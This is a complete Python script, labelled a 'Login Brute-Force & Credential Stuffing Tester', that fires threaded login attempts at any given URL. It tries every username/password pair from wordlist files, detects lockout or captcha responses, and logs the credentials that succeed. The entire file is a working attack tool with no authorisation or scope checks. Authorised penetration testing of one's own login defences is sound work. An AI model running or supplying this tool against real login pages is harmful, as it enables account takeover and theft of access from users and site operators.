#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Login Brute-Force & Credential Stuffing Tester.

Supports HTML form or JSON login endpoints with configurable parameters.
Uses shared logging utilities and command line options.
"""

import argparse
import requests
import threading
import time
from queue import Queue
from common import thread_safe_log as log

BLOCK_KEYWORDS = ["Too many attempts", "blocked", "captcha"]
SUCCESS_KEYWORDS = ["Welcome", "Dashboard", "token", "success"]

# -------------------------------------------------------------
# Worker logic
# -------------------------------------------------------------

def attempt_login(session, url, login_type, username, password, fields, log_files):
    try:
        if login_type == "form":
            data = {fields['user']: username, fields['pass']: password}
            r = session.post(url, data=data, timeout=5)
        else:
            payload = {fields['user']: username, fields['pass']: password}
            r = session.post(url, json=payload, timeout=5)
        body = r.text
        status = r.status_code
        if any(b.lower() in body.lower() for b in BLOCK_KEYWORDS):
            log(log_files["block"], f"{username}:{password} | BLOCKED")
        elif any(s.lower() in body.lower() for s in SUCCESS_KEYWORDS):
            log(log_files["success"], f"{username}:{password} | SUCCESS")
        else:
            log(log_files["fail"], f"{username}:{password} | FAIL ({status})")
    except requests.RequestException as e:
        log(log_files["error"], f"{username}:{password} | {e}")

def worker(queue, url, login_type, fields, delay, log_files):
    session = requests.Session()
    while not queue.empty():
        try:
            username, password = queue.get_nowait()
        except Exception:
            break
        attempt_login(session, url, login_type, username, password, fields, log_files)
        time.sleep(delay)

# -------------------------------------------------------------
# Main
# -------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="Login brute-force tester")
    parser.add_argument("--url", required=True, help="Login URL")
    parser.add_argument("--login-type", choices=["form", "json"], default="form")
    parser.add_argument("--user-field", default="username")
    parser.add_argument("--pass-field", default="password")
    parser.add_argument("--usernames", default="usernames.txt")
    parser.add_argument("--passwords", default="passwords.txt")
    parser.add_argument("--threads", type=int, default=10)
    parser.add_argument("--delay", type=float, default=0.2)
    parser.add_argument("--logdir", default=".")
    args = parser.parse_args()

    with open(args.usernames, encoding="utf-8") as f:
        usernames = [line.strip() for line in f if line.strip()]
    with open(args.passwords, encoding="utf-8") as f:
        passwords = [line.strip() for line in f if line.strip()]

    combo_queue = Queue()
    for u in usernames:
        for p in passwords:
            combo_queue.put((u, p))

    log_files = {
        "success": f"{args.logdir}/success_logins.txt",
        "fail": f"{args.logdir}/failed_logins.txt",
        "block": f"{args.logdir}/waf_blocks.txt",
        "error": f"{args.logdir}/login_errors.txt",
    }

    threads = []
    fields = {"user": args.user_field, "pass": args.pass_field}
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(combo_queue, args.url, args.login_type, fields, args.delay, log_files))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print("[DONE] Testing completed.")

if __name__ == "__main__":
    main()
